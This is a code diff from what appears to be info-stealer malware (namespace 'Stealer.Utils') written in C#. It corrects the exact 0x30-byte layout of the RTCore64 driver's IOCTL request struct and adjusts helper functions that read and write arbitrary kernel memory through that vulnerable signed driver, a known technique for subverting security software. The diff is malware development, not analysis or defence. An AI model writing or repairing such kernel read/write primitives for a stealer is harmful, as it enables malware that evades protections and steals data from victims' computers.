@@ -90,16 +90,17 @@ namespace Stealer.Utils
             public string FullPathName;
         }
 
-        // RTCore64 IOCTL struct
-        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        // RTCore64 IOCTL struct (0x30 bytes exact layout)
+        [StructLayout(LayoutKind.Explicit, Size = 0x30)]
         private struct RTCORE64_READ_WRITE
         {
-            public uint Unknown1;
-            public ulong Address;
-            public uint Unknown2;
-            public uint Size;
-            public uint Value;
-            public uint Unknown3;
+            [FieldOffset(0x00)] public uint Unknown0;
+            [FieldOffset(0x04)] public uint Unknown1;
+            [FieldOffset(0x08)] public ulong Address;
+            [FieldOffset(0x10)] public uint Unknown2;
+            [FieldOffset(0x14)] public uint Size;
+            [FieldOffset(0x18)] public uint Value;
+            [FieldOffset(0x1C)] public uint Unknown3;
         }
 
         private const uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
@@ -475,13 +476,11 @@ namespace Stealer.Utils
 
             try
             {
-                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE
-                {
-                    Address = (ulong)kernelAddr.ToInt64(),
-                    Size = 4
-                };
+                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE();
+                req.Address = (ulong)kernelAddr.ToInt64();
+                req.Size = 4;
 
-                int size = Marshal.SizeOf(req);
+                int size = 0x30;
                 IntPtr pReq = Marshal.AllocHGlobal(size);
                 try
                 {
@@ -512,14 +511,12 @@ namespace Stealer.Utils
 
             try
             {
-                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE
-                {
-                    Address = (ulong)kernelAddr.ToInt64(),
-                    Size = 4,
-                    Value = value
-                };
+                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE();
+                req.Address = (ulong)kernelAddr.ToInt64();
+                req.Size = 4;
+                req.Value = value;
 
-                int size = Marshal.SizeOf(req);
+                int size = 0x30;
                 IntPtr pReq = Marshal.AllocHGlobal(size);
                 try
                 {
